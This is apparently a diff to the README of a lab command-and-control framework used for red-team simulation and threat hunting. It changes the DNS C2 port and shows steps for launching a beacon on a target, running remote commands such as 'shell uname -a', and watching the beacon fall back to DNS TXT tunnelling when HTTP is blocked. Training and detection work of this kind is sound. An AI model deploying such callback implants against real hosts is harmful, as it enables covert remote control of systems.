@@ -101,7 +101,7 @@ In modern adversary simulation, red teaming, and threat hunting, **Command and C
    - `REDIRECTOR_HTTP_PORT=80` (or `8080` if 80 is occupied)
    - `C2_HEADER_NAME=X-Request-ID`
    - `C2_HEADER_VALUE=cadre-c2`
-   - `MERIDIAN_DNS_PORT=5353`
+   - `MERIDIAN_DNS_PORT=15353` (host UDP port; the container listener is always `5353/udp`. Windows keeps 5353 for mDNS, so the default host port is 15353 — change freely if 5353 is free on your host).
 
 ### Step 2: Stack Bring-Up
 
@@ -168,7 +168,7 @@ In modern adversary simulation, red teaming, and threat hunting, **Command and C
    ```bash
    # Linux Target:
    export MERIDIAN_HTTP="http://<C2STACK_IP>:80/gateway/v1/telemetry"
-   export MERIDIAN_DNS="<C2STACK_IP>:5353"
+   export MERIDIAN_DNS="<C2STACK_IP>:15353"
    export MERIDIAN_DNS_DOMAIN="c2.cadre.local"
    ./parallax-linux-amd64
    ```
@@ -182,7 +182,7 @@ In modern adversary simulation, red teaming, and threat hunting, **Command and C
    - Run `exec whoami` or `shell uname -a`
    - Run `results` to view encrypted-at-rest execution output.
 4. **Simulate Firewall Blocking**:
-   Block outbound HTTP on the target host (`iptables -A OUTPUT -p tcp --dport 80 -j DROP`). Observe that the beacon loop automatically switches to chunked DNS TXT queries over UDP 5353 without session disruption.
+   Block outbound HTTP on the target host (`iptables -A OUTPUT -p tcp --dport 80 -j DROP`). Observe that the beacon loop automatically switches to chunked DNS TXT queries over UDP `<C2STACK_IP>:15353` (mapped to the container's 5353/udp) without session disruption.
 
 ---
 
@@ -270,7 +270,7 @@ When C2Stack is used against the CADRE range, it generates realistic blue-team t
 In the full **CADRE Platform**, C2Stack pairs directly with the 7-VM Active Directory lab (`192.168.77.0/24`):
 
 1. **Campaign Execution**: RedStrike or custom operators trigger initial access (Campaign H) or lateral movement (Campaign C/D).
-2. **Callback Ingress**: Target VMs (`dc01`, `mbr01`, `ws01`) call back into the Docker host via `192.168.77.1` (vmnet2 adapter) on port 80/5353.
+2. **Callback Ingress**: Target VMs (`dc01`, `mbr01`, `ws01`) call back into the Docker host via `192.168.77.1` (vmnet2 adapter) on port 80 (HTTP via redirector) and UDP `15353` (DNS C2, → container 5353/udp).
 3. **Investigation & Triage**: DFIR-Nexus ingests Windows EVTX, memory dumps, and network PCAPs captured during C2 execution to reconstruct the attack timeline.
 
 ---
